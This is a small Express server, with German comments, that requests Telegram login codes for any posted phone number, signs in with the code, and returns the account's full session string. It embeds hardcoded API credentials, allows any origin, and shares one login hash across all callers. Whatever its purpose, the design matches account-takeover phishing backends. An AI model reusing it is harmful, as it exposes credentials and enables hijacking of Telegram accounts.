const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });

let phoneCodeHash = '';

app.post('/send-code', async (req, res) => {
    try {
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, req.body.phone);
        phoneCodeHash = result.phoneCodeHash;
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/verify-code', async (req, res) => {
    try {
        // Explizite Übergabe der Parameter als Objekt
        await client.signIn({
            phoneNumber: req.body.phone,
            phoneCode: req.body.phoneCode,
            phoneCodeHash: phoneCodeHash
        });
        
        const sessionString = client.session.save();
        res.json({ success: true, session: sessionString });
    } catch (err) {
        // Hier fangen wir ab, falls das Objekt undefiniert ist
        res.status(500).json({ error: err.message });
    }
});

app.listen(3000, () => console.log('Server läuft.'));
